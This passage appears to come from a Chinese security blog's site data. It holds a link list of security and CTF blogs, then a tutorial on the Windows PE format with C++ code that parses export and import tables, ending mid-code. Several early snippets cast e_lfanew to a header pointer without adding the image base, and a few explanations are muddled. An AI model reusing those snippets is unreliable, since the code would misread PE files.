信息安全爱好者 &#x2F; 全栈开发 &#x2F; 为心中的美好而战                            \nwonderkun’s | blog                            \nFlanker Sky | About security and coding\n\n综合大佬\n安全工具-NGC660安全实验室                            \n简言之                            \nお前はどこまで見えている - 僕たちは そうやって どこまで行くのだろう、どこまで行けるのだろう                            \nLanYunのBlog                            \nGKSEC - ATD SECURITY TEAM  \n首页 | 离别歌                            \nsky’s blog                            \n卿先生 - 博客园                            \n(6条消息) yu22x的博客_CSDN博客-CTFSHOW web入门系列,CTF show WEB系列,0day领域博主                            \nY4er的博客                            \nMisaki’s Blog                            \nevilpan                            \nHpdoger                            \nMrkaixin                            \nlaziok · GitHub                            \nLonglone’s Blog                            \n5alt’s Blog                            \nAryb1n’s notebook                            \n(13条消息) 奈沙夜影的博客_CSDN博客-CTF,CrackMe,Android领域博主                            \nhac425 - 博客园                            \nMiaoTony’s小窝                            \nAnemone’s Blog                            \n闪烁之狐                            \n书鱼                            \nZIKH26’s Blog                            \nMssn Harvey - CTFer &amp;&amp; DreamRedteam                            \n⑨BIE                            \nXiaoLeiZhaoO的博客_CSDN博客-笔记领域博主                            \nhttps://guokeya.github.io/                            \nEVILCOS – &#x2F;&#x2F;:alert(&#x2F;Hacking Symbol&#x2F;)&#x2F;&#x2F;余弦                            \n闲言语                            \nthestar | Don’t ever let somebody tell you you can’t do something, not even me                            \nMoominn - 博客园                            \n分类 | Y0ng的博客                            \nATFWUS的博客_CSDN博客-算法,数据结构,CTF-PWN领域博主                            \nYulate’s Blog-this is my blog                            \n[mzq]的博客_CSDN博客-笔记,ctf,buuctf领域博主                            \n会下雪的晴天                            \n所有标签 - byc_404’s blog                            \n渗透测试中心 - 博客园                            \nnovy’s Blog                            \n春告鳥 - 博客园                            \n所有标签 - zu1k\n\n","slug":"简易导航","date":"2021-01-23T07:50:23.000Z","categories_index":"导航","tags_index":"资源","author_index":"Akpigs"},{"id":"86f54a7f49d13d2fe3670c2f70767f91","title":"PE文件结构","content":"什么是文件存储数据的实体。\n不同的文件是给不同的软件去使用的。不同的文件主要是格式不同。\n格式就是数组的排列组织方式\n。软件读取文件，按照固定的形式去解析文件的。\n什么是PE文件（Portable Executable）可执行 文件的缩写。这种类型的文件，是供windows系统解析，解析完了之后能够创建出进程去运行的文件。\nPE头部信息（DOS头，NT头，区段表）\n我们学习PE文件学习的是什么呢？？学习的就是PE文件的格式，学习格式就是在学习一堆结构体。很多东西需要记忆。\n为了便于我们记忆，需要一些辅助性的工具。\nPE头部粗略图\n\nDOS头简介在windows系统中的可执行文件在设计的时候，考虑到了兼容性问题。在正常的可执行文件的一开始的部分。嵌入了一个DOS可执行文件。作用就是在MS-DOS系统下能够输出一行这个程序不是运行在此系统下的。\n\n\n这里有两个字段是有用的：\n第一个 e_magic 永远都是 0x4D 0x5A 0x5A4D 你需要知道大端和小端的知识。\n最后一个 e_lfanew 它是真正的可执行文件的起始位置。\n\n实验一:假如我们修改了e_magic字段或者e_lfanew，PE文件是否还能运行？\n将e_magic修改为”OZ”，保存执行\n将e_magic改回”MZ”，e_lfanew改为0x1000，保存执行\n\n\n\n尝试之后不行，这两个字段是重要字段，抹掉程序就无法运行了。\n\n实验二：抹掉除了e_magic和e_lfanew之外的字段，可不可以。\n\n怎么找到DOS头&#x2F;&#x2F;lpImage是ReadFile打开文件后的写入的缓冲区（堆空间）\nPIMAGE_DOS_HEADER pDos &#x3D; (PIMAGE_DOS_HEADER)lpImage;\n&#x2F;&#x2F;pDos的e_magic字段，作为是否为PE文件的标志\npDos-&gt;e_magic &#x3D;&#x3D; IMAGE_DOS_SIGNATURE\n&#x2F;&#x2F;pDos的e_lfanew字段可以指向NT头的空间\nPIMAGE_NT_HEADERS pNt &#x3D; (PIMAGE_NT_HEADERS)pDos-&gt;e_lfanew;\n\n&#x2F;&#x2F;例：\n&#x2F;&#x2F;1 打开文件\n\tHANDLE hFile &#x3D; CreateFile(\n\t\tPATH,\n\t\tGENERIC_ALL,\n\t\tNULL,\n\t\tNULL,\n\t\tOPEN_EXISTING,\n\t\tFILE_ATTRIBUTE_NORMAL,\n\t\tNULL\n\t);\n\t&#x2F;&#x2F;2 获取文件大小\n\tDWORD dwFileSize &#x3D; GetFileSize(hFile, NULL);\n\t&#x2F;&#x2F;3 申请空间并初始化\n\tchar* buf &#x3D; new char[dwFileSize] &#123;0&#125;;\n\t&#x2F;&#x2F;4 读取文件\n\tDWORD dwRealSize &#x3D; 0;\n\tReadFile(hFile, buf, dwFileSize, &amp;dwRealSize, NULL);\n\nNT头typedef struct _IMAGE_NT_HEADERS\n&#123;\n    DWORD Signature;                        &#x2F;&#x2F; [0x00]PE标识\n    IMAGE_FILE_HEADER FileHeader;           &#x2F;&#x2F; [0x04]文件头\n    IMAGE_OPTIONAL_HEADER32 OptionalHeader; &#x2F;&#x2F; [0x18]扩展头\n&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;\n\n怎么找到Nt头?\n通过DOS头的最后一个字段：e_lfanew 指定的是NT头的位置\nSignature：\n标识：PE00\n可以和魔数配合，判断是否是PE文件。\n永远都是 0x50 0x45 0x00 0x00 0x00004550\n&#x2F;&#x2F;打开PE文件后，第一个段就是DOS头部\nPIMAGE_DOS_HEADER pDos &#x3D; (PIMAGE_DOS_HEADER)lpImage;\n&#x2F;&#x2F;pDos的e_lfanew字段可以指向NT头的空间，使用NT头接收\nPIMAGE_NT_HEADERS pNt &#x3D; (PIMAGE_NT_HEADERS)pDos-&gt;e_lfanew;\n\nIMAGE_FILE_HEADER：\ntypedef struct _IMAGE_FILE_HEADER &#123;\n    WORD     Machine;\t\t\t        &#x2F;&#x2F;[0x04] （1）运行平台\n    WORD     NumberOfSections;\t\t&#x2F;&#x2F;[0x06] （2）区段的数量*\n    DWORD   TimeDateStamp;\t\t    &#x2F;&#x2F;[0x08] （3）文件创建时间\n    DWORD   PointerToSymbolTable;\t&#x2F;&#x2F;[0x0C] （4）符号表指针\n    DWORD   NumberOfSymbols;\t\t  &#x2F;&#x2F;[0x10] （5）符号的数量\n    WORD     SizeOfOptionalHeader;&#x2F;&#x2F;[0x14] （6）扩展头大小*\n    WORD     Characteristics;\t\t  &#x2F;&#x2F;[0x16] （7）文件属性\n&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;\n\n\n\n重要的：\nNumberOfSection：区段的数量\nSizeOfOptionalHeader：扩展头的大小。因为扩展头中数据目录表的个数是不确定的。所以这里需要一个大小\n有用的：\nMachine：运行平台\nTimeDateStamp：时间戳 表明是在什么时候编译的\n手工解析\nCode\n50 45 00 00 4C 01 05 00 91 CF 44 54 00 00 00 00\n00 00 00 00 E0 00 02 01 \n\n50 45 00 00 PE标识\n01 4C 运行平台\n00 没用\n05 区段数量\n91 CF 44 54 时间戳\nE0 扩展头大小\n0201 属性\n因为大端小端，我们需要反过来看\n关于镜像，映像，虚拟地址，相对虚拟地址镜像：就是PE文件自身\n映像：就是根据PE文件映射出来的，\n虚拟地址：程序中的内存地址，就是虚拟地址。\n相对虚拟地址：就是相对于加载基址的偏移。\n文件头IMAGE_FILE_HEADER\n文件头结构体typedef struct _IMAGE_FILE_HEADER &#123;\n    WORD    Machine;\t\t\t\t\t\t&#x2F;&#x2F;运行平台\n    WORD    NumberOfSections;\t\t\t\t&#x2F;&#x2F;区段的数量\n    DWORD   TimeDateStamp;\t\t\t\t\t&#x2F;&#x2F;文件创建的时间\n    DWORD   PointerToSymbolTable;\t\t\t&#x2F;&#x2F;符号表偏移\n    DWORD   NumberOfSymbols;\t\t\t\t&#x2F;&#x2F;符号个数\n    WORD    SizeOfOptionalHeader;\t\t\t&#x2F;&#x2F;扩展头大小\n    WORD    Characteristics;\t\t\t\t&#x2F;&#x2F;PE文件的一些属性\n&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;\n\n怎么找到文件头&#x2F;&#x2F;打开PE文件后，第一个段就是DOS头部\nPIMAGE_DOS_HEADER pDos &#x3D; (PIMAGE_DOS_HEADER)lpImage;\n&#x2F;&#x2F;pDos的e_lfanew字段可以指向NT头的空间，使用NT头接收\nPIMAGE_NT_HEADERS pNt &#x3D; (PIMAGE_NT_HEADERS)pDos-&gt;e_lfanew;\n&#x2F;&#x2F;NT头结构体的第二个参数就是指向扩展头\nPIMAGE_FILE_HEADER pFile &#x3D; (PIMAGE_FILE_HEADER)&amp;pNt-&gt;FileHeader;\n\n扩展头IMAGE_OPTIONAL_HEADER：\n找到扩展头&#x2F;&#x2F;打开PE文件后，第一个段就是DOS头部\nPIMAGE_DOS_HEADER pDos &#x3D; (PIMAGE_DOS_HEADER)lpImage;\n&#x2F;&#x2F;pDos的e_lfanew字段可以指向NT头的空间，使用NT头接收\nPIMAGE_NT_HEADERS pNt &#x3D; (PIMAGE_NT_HEADERS)pDos-&gt;e_lfanew;\n&#x2F;&#x2F;NT头结构体的第三个参数就是指向扩展头\n\tPIMAGE_OPTIONAL_HEADER pOption &#x3D;  (PIMAGE_OPTIONAL_HEADER)&amp;pNt-&gt;OptionalHeader;\n\n扩展头结构体typedef struct _IMAGE_OPTIONAL_HEADER &#123;\n    &#x2F;&#x2F; 标准域\n    WORD    Magic;\t\t\t\t\t\t&#x2F;&#x2F;[0x18] (1) 标志位\n    BYTE    MajorLinkerVersion; \t\t&#x2F;&#x2F;[0x1A] (2) 连接器主版本号\n    BYTE    MinorLinkerVersion; \t\t&#x2F;&#x2F;[0x1B] (3) 连接器子版本号\n    DWORD   SizeOfCode; \t\t\t\t&#x2F;&#x2F;[0x1C] (4) 所有代码段 的总大小\n    DWORD   SizeOfInitializedData; \t\t&#x2F;&#x2F;[0x20] (5) 所有初始化段总大小\n    DWORD   SizeOfUninitializedData;\t&#x2F;&#x2F;[0x24] (6) 所有未初始化段总大小\n    DWORD   AddressOfEntryPoint;\t\t&#x2F;&#x2F;[0x28] (7) 程序执行入口RVA*\n    DWORD   BaseOfCode; \t\t\t\t&#x2F;&#x2F;[0x2C] (8) 代码段起始RVA\n    DWORD   BaseOfData; \t\t\t\t&#x2F;&#x2F;[0x30] (9) 数据段起始RVA\n    &#x2F;&#x2F; NT 附加域\n    DWORD   ImageBase; \t\t\t\t\t&#x2F;&#x2F;[0x34] (10) 程序默认载入基地址*\n    DWORD   SectionAlignment; \t\t\t&#x2F;&#x2F;[0x38] (11) 内存中的段对齐值\n    DWORD   FileAlignment; \t\t\t\t&#x2F;&#x2F;[0x3C] (12) 文件中的段对齐值\n    WORD    MajorOperatingSystemVersion; &#x2F;&#x2F;[0x40] (13) 系统主版本号\n    WORD    MinorOperatingSystemVersion; &#x2F;&#x2F;[0x42] (14) 系统子版本号\n    WORD    MajorImageVersion; \t\t\t&#x2F;&#x2F;[0x44] (15) 自定义的主版本号\n    WORD    MinorImageVersion;\t\t\t&#x2F;&#x2F;[0x46] (16) 自定义的子版本号\n    WORD    MajorSubsystemVersion; \t\t&#x2F;&#x2F;[0x48] (17) 所需子系统主版本号\n    WORD    MinorSubsystemVersion; \t\t&#x2F;&#x2F;[0x4A] (18) 所需子系统子版本号\n DWORD   Win32VersionValue;\t\t\t\t&#x2F;&#x2F;[0x4C] (19) 保留，通常为0x00\n    DWORD   SizeOfImage; \t\t\t\t&#x2F;&#x2F;[0x50] (20) 内存中映像总尺寸*\n    DWORD   SizeOfHeaders; \t\t\t\t&#x2F;&#x2F;[0x54] (21) 各个文件头的总尺寸*\n    DWORD   CheckSum; \t\t\t\t\t&#x2F;&#x2F;[0x58] (22) 映像文件校验和\n    WORD     Subsystem; \t            &#x2F;&#x2F;[0x5C] (23) 文件子系统\n    WORD     DllCharacteristics; \t\t&#x2F;&#x2F;[0x5E] (24) DLL标志位\n    DWORD   SizeOfStackReserve;         &#x2F;&#x2F;[0x60] (25) 初始化栈大小\n    DWORD   SizeOfStackCommit;        \t&#x2F;&#x2F;[0x64] (26) 初始化实际提交栈大小\n    DWORD   SizeOfHeapReserve;         \t&#x2F;&#x2F;[0x68] (27) 初始化保留栈大小\n    DWORD   SizeOfHeapCommit;         \t&#x2F;&#x2F;[0x6C] (28) 初始化实际保留栈大小\n    DWORD   LoaderFlags;                &#x2F;&#x2F;[0x70] (29) 调试相关，默认0x00\n    DWORD   NumberOfRvaAndSizes;  \t\t&#x2F;&#x2F;[0x74] (30) 数据目录表的数量*\n    IMAGE_DATA_DIRECTORY DataDirectory[0x10]; &#x2F;&#x2F;[0x78] (31) 数据目录表*\n&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;\n\n\n\n非常重要的：\nImageBase：程序的默认加载基址。\nAddressOfEntryPoint： 程序的入口点（EP）。\n比较重要的：\nSectionAlignment： 内存对齐 0x1000（因为一页内存是4KB）\nFileAlignment： 文件对齐 0x200\nSizeOfImage： 映像大小（我这个PE文件被加载到内存，占用空间应该是多大）\nSIzeOfHeader： 头部大小 DOS头+NT头+区块表的大小。\nNumberOfRvaAndSizes: 数据目录表的元素个数\nDllCharacteristics： PE的一组属性。。。。\n极为重要的：\n数据目录表DataDirectory\n&#x2F;&#x2F;打开PE文件后，第一个段就是DOS头部\nPIMAGE_DOS_HEADER pDos &#x3D; (PIMAGE_DOS_HEADER)lpImage;\n&#x2F;&#x2F;pDos的e_lfanew字段可以指向NT头的空间，使用NT头接收\nPIMAGE_NT_HEADERS pNt &#x3D; (PIMAGE_NT_HEADERS)pDos-&gt;e_lfanew;\n&#x2F;&#x2F;NT头结构体的第三个参数就是指向扩展头\n\tPIMAGE_OPTIONAL_HEADER pOption &#x3D;  (PIMAGE_OPTIONAL_HEADER)&amp;pNt-&gt;OptionalHeader;\n&#x2F;&#x2F;扩展头最后一个参数就是数据目录表\nPIMAGE_DATA_DIRECTORY pDataDir &#x3D; pOption-&gt;DataDirectory;\n\n描述了PE文件中16个非常重要的数据块的大小和位置。\n\n\n导出表什么是导出提供函数给其他模块使用的一种行为\n怎么导出方法1：声明导出\n#pragma once\nextern &quot;C&quot; _declspec(dllexport) void Fun1();\nextern &quot;C&quot; _declspec(dllexport) void Fun2();\n\n方法2：def文件导出\nEXPORTS \nFun3 @1 \nFun4 @2 NONAME\n\n注意：NONAME 是只导出序号，没有名字\n导出表的作用是什么? 没有它exe能运行吗?\n用以记录本模块能够给其他模块提供的函数的信息。\n函数名 函数地址 函数的序号\n程序运行的时候，会检查主模块的导入表，看用了哪些其他模块，就会将此模块加载到进程空间中。加载进来之后，分析INT（IAT）得到函数名称，用这个名称去导出表中找到函数地址的RVA，RVA+模块基址，就是真正的函数地址，将此函数地址填充到IAT中，从而完成加载后的IAT功能。\n一个PE文件，可以没有导出表的，比如exe文件，一般都没有。\n已知一个dll名,和一个dll导出函数的名字, 如何得到这个函数名的地址?\n得到DLL的导出表，然后在函数名称表中找函数名，如果找到了，由于序号表和名称表位置是一一对应的，就会得到序号表的下标，然后就将序号当成地址表的下标，从而得到地址。\nGetProcAddress();\n怎么才能知道一个exe都使用了哪些API?\n分析exe的导入表即可，其中记录了模块名和函数名。\n如何判断导入函数是以序号导入或是以名称导入?\nIMAGE_THUNK_DATA32这个结构体，他的最高位是1的话，那么就只有序号，如果最高位是0的话，那么久有序号，也有名称。\n怎么才知道导出函数是仅以序号导出还是以名称导出?\n对于一个导出函数而言，他的地址表的下标，就是此函数的序号，如果这个序号，在序号表中，没有记录，那么他就是一个虚序号，也就是没有名称，只有序号。\n怎么找到一个PE文件的导出信息通过数据目录表的第0项：\n手工分析过程：\n\n获得信息：导出表的RVA：00018D90 ——&gt;FOA： 7590 (FOA&#x3D; RVA - RVA区段+ FOA区段)\n备注：\n FOA:文件的偏移位置\n RVA：相对虚拟地址\n RVA区段：该段段首地址\n FOA区段：文件偏移的段首地址\nSIZE：5F21\n\n\n模块名称在12个字节后的四个字节中，也就是0x0001DBEA\nBase:00 00 00 01 索引基数\nNumberOfFunctions:00 00 13 88 导出地址表中成员个数\nNumberOfNames:00 00 00 03\nAddressOfFunctions(rva):00 01 8D B8 导出地址表（EAT）\nAddressOfNames(rva):00 01 DB D8 导出名称表（ENT）\nAddressOfNameOrdinals;：0x1DBE4 指向导出序号表\ntypedef struct _IMAGE_EXPORT_DIRECTORY &#123;\n    DWORD  Characteristics;\t   &#x2F;&#x2F; (1) 保留，恒为0x00000000\n    DWORD  TimeDateStamp;\t   &#x2F;&#x2F; (2) 时间戳\n    WORD   MajorVersion;\t   &#x2F;&#x2F; (3) 主版本号，一般不赋值\n    WORD   MinorVersion;\t   &#x2F;&#x2F; (4) 子版本号，一般不赋值\n    DWORD  Name;\t\t   &#x2F;&#x2F; (5) 模块名称*\n    DWORD  Base;\t\t   &#x2F;&#x2F; (6) 索引基数*\n    DWORD  NumberOfFunctions;  &#x2F;&#x2F; (7) 导出地址表中成员个数*\n    DWORD  NumberOfNames; \t   &#x2F;&#x2F; (8) 导出名称表中成员个数*\n    DWORD  AddressOfFunctions; &#x2F;&#x2F; (9) 导出地址表（EAT）*\n    DWORD  AddressOfNames;\t   &#x2F;&#x2F; (10) 导出名称表（ENT）*\n    DWORD  AddressOfNameOrdinals; &#x2F;&#x2F; (11) 指向导出序号表*\n&#125;IMAGE_EXPORT_DIRECTORY,*PIMAGE_EXPORT_DIRECTORY;\n\n模块名称0x0001DBEA 转换RVA —FOA: C3EA\n\n\n找到dll.dll\n地址表成员个数为1388转换成字节：1388h&#x3D;5000d 十六进制转换为十进制\n 1388*4&#x3D;4E20 十六进制数乘4\n 5000*4&#x3D;20000 十进制数乘4\n我们从地址表：0x 18DB8开始找，由于18DB8是RVA，这里需要转换FOA:75B8\n\n\nAddressOfNameOrdinals;：1DBE4 指向导出序号表 转换FOA:C3E4\n\n\n#include &lt;iostream&gt;\n#include &lt;Windows.h&gt;\n#define PATH L&quot;C:\\\\Users\\\\SouLinker\\\\Desktop\\\\dll.dll&quot;\n&#x2F;&#x2F; 判断是不是PE文件\n\n\nDWORD RvaToFoa(char* lpImage, DWORD dwRva);\nBOOL IsPE_File(char* lpImage);\nvoid AnalyzeExportsTabel(char* lpImage);\nint main()\n&#123;\n\t&#x2F;&#x2F;1 打开文件\n\tHANDLE hFile &#x3D; CreateFile(\n\t\tPATH,\n\t\tGENERIC_ALL,\n\t\tNULL,\n\t\tNULL,\n\t\tOPEN_EXISTING,\n\t\tFILE_ATTRIBUTE_NORMAL,\n\t\tNULL\n\t);\n\t&#x2F;&#x2F;2 获取文件大小\n\tDWORD dwFileSize &#x3D; GetFileSize(hFile, NULL);\n\t&#x2F;&#x2F;3 申请空间并初始化\n\tchar* buf &#x3D; new char[dwFileSize] &#123;0&#125;;\n\t&#x2F;&#x2F;4 读取文件\n\tDWORD dwRealSize &#x3D; 0;\n\tReadFile(hFile, buf, dwFileSize, &amp;dwRealSize, NULL);\n\t&#x2F;&#x2F;5 判断是不是PE文件\n\tif (IsPE_File(buf) &#x3D;&#x3D; TRUE)\n\t&#123;\n\t\t&#x2F;&#x2F;printf(&quot;这是一个PE文件&quot;);\n\t\tAnalyzeExportsTabel(buf);\n\t&#125;\n\telse\n\t&#123;\n\t\tprintf(&quot;这不是一个PE文件&quot;);\n\t&#125;\n\tdelete[]buf;\n\tbuf &#x3D; nullptr;\n\treturn 0;\n&#125;\n\nDWORD RvaToFoa(char* lpImage, DWORD dwRva)\n&#123;\n\t&#x2F;&#x2F;1 获取区段表的起始位置\n\tPIMAGE_DOS_HEADER pDos &#x3D; (PIMAGE_DOS_HEADER)lpImage;\n\tPIMAGE_NT_HEADERS pNt &#x3D; (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);\n\tPIMAGE_SECTION_HEADER pHeader &#x3D; IMAGE_FIRST_SECTION(pNt);\n\n\tif (dwRva &lt; pNt-&gt;OptionalHeader.SizeOfHeaders)\n\t&#123;\n\t\treturn dwRva;\n\t&#125;\n\t&#x2F;&#x2F;2 循环判断RVA落在了哪个区段中\n\tfor (int i &#x3D; 0; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++)\n\t&#123;\n\t\tDWORD dwSectionRva &#x3D; pHeader[i].VirtualAddress;\n\t\tDWORD dwSectionEndRva &#x3D; dwSectionRva + pHeader[i].SizeOfRawData;\n\t\tDWORD dwSectionFOA &#x3D; pHeader[i].PointerToRawData;\n\t\tif (dwRva &gt;&#x3D; dwSectionRva &amp;&amp; dwRva &lt;&#x3D; dwSectionEndRva)\n\t\t&#123;\n\t\t\tpHeader[i].VirtualAddress;\n\t\t\tDWORD dwFOA &#x3D; dwRva - dwSectionRva + dwSectionFOA;\n\t\t\treturn dwFOA;\n\t\t&#125;\n\t&#125;\n\treturn -1;\n&#125;\nBOOL IsPE_File(char* lpImage)\n&#123;\n\tPIMAGE_DOS_HEADER pDos &#x3D; (PIMAGE_DOS_HEADER)lpImage;\n\tif (pDos-&gt;e_magic !&#x3D; IMAGE_DOS_SIGNATURE)\n\t&#123;\n\t\treturn FALSE;\n\t&#125;\n\tPIMAGE_NT_HEADERS pNt &#x3D; (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);\n\n\tif (pNt-&gt;Signature !&#x3D; IMAGE_NT_SIGNATURE)\n\t&#123;\n\t\treturn FALSE;\n\t&#125;\n\treturn TRUE;\n&#125;\n\nvoid AnalyzeExportsTabel(char* lpImage)\n&#123;\n\t&#x2F;&#x2F;1 获取到导出表的结构\n\tPIMAGE_DOS_HEADER pDos &#x3D; (PIMAGE_DOS_HEADER)lpImage;\n\tPIMAGE_NT_HEADERS pNt &#x3D; (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);\n\t&#x2F;&#x2F;1 获取到导出表的数据目录结构\n\tPIMAGE_DATA_DIRECTORY pExportDir &#x3D;  &amp;pNt-&gt;OptionalHeader.DataDirectory[0];\n\t&#x2F;&#x2F;1 导出表的数据目录结构中，有导出表的RVA，咱们需要将其转换为FOA，才能在文件中使用\n\tDWORD dwExportFOA &#x3D; RvaToFoa(lpImage, pExportDir-&gt;VirtualAddress);\n\t&#x2F;&#x2F;1 已经得到了FOA，直接就能够找到导出表的结构\n\tPIMAGE_EXPORT_DIRECTORY pExport &#x3D; (PIMAGE_EXPORT_DIRECTORY)(lpImage + dwExportFOA);\n\t&#x2F;&#x2F;typedef struct _IMAGE_EXPORT_DIRECTORY &#123;\n\t&#x2F;&#x2F;\tDWORD   Characteristics;\n\t&#x2F;&#x2F;\tDWORD   TimeDateStamp;\n\t&#x2F;&#x2F;\tWORD    MajorVersion;\n\t&#x2F;&#x2F;\tWORD    MinorVersion;\n\t&#x2F;&#x2F;\tDWORD   Name;\n\t&#x2F;&#x2F;\tDWORD   Base;\n\t&#x2F;&#x2F;\tDWORD   NumberOfFunctions;\n\t&#x2F;&#x2F;\tDWORD   NumberOfNames;\n\t&#x2F;&#x2F;\tDWORD   AddressOfFunctions;     &#x2F;&#x2F; RVA from base of image\n\t&#x2F;&#x2F;\tDWORD   AddressOfNames;         &#x2F;&#x2F; RVA from base of image\n\t&#x2F;&#x2F;\tDWORD   AddressOfNameOrdinals;  &#x2F;&#x2F; RVA from base of image\n\t&#x2F;&#x2F;&#125; IMAGE_EXPORT_DIRECTORY, * PIMAGE_EXPORT_DIRECTORY;\n\tDWORD dwBase &#x3D; pExport-&gt;Base;\n\t&#x2F;&#x2F;2 得到地址表，名称表，序号表的 FOA\n\tDWORD EatFoa &#x3D; RvaToFoa(lpImage,pExport-&gt;AddressOfFunctions);\n\tDWORD EntFoa &#x3D; RvaToFoa(lpImage, pExport-&gt;AddressOfNames);\n\tDWORD EotFoa &#x3D; RvaToFoa(lpImage, pExport-&gt;AddressOfNameOrdinals);\n\t&#x2F;&#x2F;3 得到地址表，名称表，序号表在文件中的位置\n\tPDWORD  pEat&#x3D; (PDWORD)(lpImage + EatFoa);\n\tPDWORD  pEnt &#x3D; (PDWORD)(lpImage + EntFoa);\n\tPWORD pEot &#x3D; (PWORD)(lpImage + EotFoa);\n\t&#x2F;&#x2F;4 开始解析\n\tfor (int i &#x3D; 0; i &lt; pExport-&gt;NumberOfFunctions; i++)\n\t&#123;\n\t\t&#x2F;&#x2F;4.1 无效地址\n\t\tif (pEat[i] &#x3D;&#x3D; 0)\n\t\t&#123;\n\t\t\tcontinue;\n\t\t&#125;\n\t\t&#x2F;&#x2F;4.2 有效地址将下标放到序号表中去寻找\n\t\tint  j &#x3D; 0;\n\t\tint nSign &#x3D; FALSE;\n\t\tfor (; j &lt; pExport-&gt;NumberOfNames; j++)\n\t\t&#123;\n\t\t\tif (i &#x3D;&#x3D; pEot[j])\n\t\t\t&#123;\n\t\t\t\tnSign &#x3D; TRUE;\n\t\t\t\tbreak;\n\t\t\t&#125;\n\t\t&#125;\n\t\t&#x2F;&#x2F;4.2.1 找到了，就是有名字的函数\n\t\tif (nSign&#x3D;&#x3D; TRUE)\n\t\t&#123;\n\t\t\t&#x2F;&#x2F;名称表中，存储的是RVA，需要转为FOA\n\t\t\tDWORD dwFunNameFOA &#x3D;  RvaToFoa(lpImage, pEnt[j]);\n\t\t\tchar* pFunName &#x3D; lpImage + dwFunNameFOA;\n\t\t\tprintf(&quot;序号:%4x 地址:%x 名称:%s\\n&quot;, i+ dwBase, pEat[i], pFunName);\n\t\t&#125;\n\t\t&#x2F;&#x2F;4.2.2 没有找到，就是没有名字的函数，虚序号\n\t\telse\n\t\t&#123;\n\t\t\tprintf(&quot;序号:%4x 地址:%x 名称:NULL\\n&quot;, i + dwBase, pEat[i]);\n\t\t&#125;\n\t&#125;\n&#125;\n\n导入表什么是导入当一个可执行文件使用到了其他模块中的函数的时候，就是导入行为。在PE文件中，有一个位置记录了此可执行文件 使用的所有其他模块的函数信息。这个位置就是导入表。\n导入表的作用是什么?\n在加载之前，导入表里面记录本模块所使用的哪些DLL中的哪些函数的名称信息。\n在加载之后，导入表能够记录所使用的函数的地址。供程序运行期间，找到所使用的函数。\n导入表结构体\nC++\ntypedef struct _IMAGE_IMPORT_DESCRIPTOR &#123;\n    union &#123;\n        DWORD Characteristics; \n        DWORD OriginalFirstThunk;&#x2F;&#x2F;(1) 指向导入名称表(INT)的RAV*\n    &#125;;\n    DWORD   TimeDateStamp;\t&#x2F;&#x2F; (2) 时间标识\n    DWORD   ForwarderChain;\t&#x2F;&#x2F; (3) 转发链，如果不转发则此值为0\n    DWORD   Name;\t\t&#x2F;&#x2F; (4) 指向导入映像文件的名字*\n    DWORD   FirstThunk;\t&#x2F;&#x2F; (5) 指向导入地址表（IAT）的RAV*\n&#125; IMAGE_IMPORT_DESCRIPTOR;\n\nOriginalFirstThunk与FirstThunk得到位置，也是一个结构体数组，定义如下：\ntypedef struct _IMAGE_THUNK_DATA32 &#123;\n    union &#123;\n        PBYTE  ForwarderString;\t                                          &#x2F;&#x2F; (1) 转发字符串的RAV\n        PDWORD Function;\t\t                &#x2F;&#x2F; (2) 被导入函数的地址\n        DWORD Ordinal;\t\t                &#x2F;&#x2F; (3) 被导入函数的序号\n        PIMAGE_IMPORT_BY_NAME  AddressOfData;    &#x2F;&#x2F; (4) 指向输入名称表\n&#125; u1;\n&#125; IMAGE_THUNK_DATA32;\n\n\n当此结构体最高位为0的时候，且此时存储的是导入名称信息，PIMAGE_IMPORT_BY_NAME起作用\n当此结构体最高位为1的时候，且此时存储的是导入名称信息， DWORD Ordinal起作用\n当此结构体存储的是导入地址信息的时候，PDWORD Function起作用\n\n手工解析数据目录表的第1项，就是导入表信息：\n\n\nRVA：19CE90 ———》 转为FOA： B890\nSIZE：0168\n\n\ntypedef struct _IMAGE_IMPORT_DESCRIPTOR &#123;\n    union &#123;\n        DWORD Characteristics; \n        DWORD OriginalFirstThunk;&#x2F;&#x2F;(1) 指向导入名称表(INT)的RAV*\n    &#125;;\n    DWORD   TimeDateStamp;\t&#x2F;&#x2F; (2) 时间标识\n    DWORD   ForwarderChain;\t&#x2F;&#x2F; (3) 转发链，如果不转发则此值为0\n    DWORD   Name;\t\t&#x2F;&#x2F; (4) 指向导入映像文件的名字*\n    DWORD   FirstThunk;\t&#x2F;&#x2F; (5) 指向导入地址表（IAT）的RAV*\n&#125; IMAGE_IMPORT_DESCRIPTOR;\n\nName: 0019E460 —–&gt; 19CE60\n\n\nOriginalFirstThunk: 0019D1CC —–&gt;19BBCC (INT)\n\n\nirstThunk: 001504D4 —–&gt; 14EED4（IAT）\n\n\n加载之后，INT中的内容还是原来的内容\n在OD中，加载之后，IAT里面，存储的已经是各个API的地址了。\n测试代码&#x2F;&#x2F; 02_解析导入表.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。\n&#x2F;&#x2F;\n\n#include &lt;iostream&gt;\n#include &lt;Windows.h&gt;\n#define PATH L&quot;C:\\\\Users\\\\hugan\\\\Desktop\\\\FileCleaner2.0.exe&quot;\n&#x2F;&#x2F; 判断是不是PE文件\n\n\nDWORD RvaToFoa(char* lpImage, DWORD dwRva);\nBOOL IsPE_File(char* lpImage);\nvoid AnalyzeImportTabel(char* lpImage, bool bAnalyzeInt);\nint main()\n&#123;\n\t&#x2F;&#x2F;1 打开文件\n\tHANDLE hFile &#x3D; CreateFile(\n\t\tPATH,\n\t\tGENERIC_ALL,\n\t\tNULL,\n\t\tNULL,\n\t\tOPEN_EXISTING,\n\t\tFILE_ATTRIBUTE_NORMAL,\n\t\tNULL\n\t);\n\t&#x2F;&#x2F;2 获取文件大小\n\tDWORD dwFileSize &#x3D; GetFileSize(hFile, NULL);\n\t&#x2F;&#x2F;3 申请空间并初始化\n\tchar* buf &#x3D; new char[dwFileSize] &#123;0&#125;;\n\t&#x2F;&#x2F;4 读取文件\n\tDWORD dwRealSize &#x3D; 0;\n\tReadFile(hFile, buf, dwFileSize, &amp;dwRealSize, NULL);\n\t&#x2F;&#x2F;5 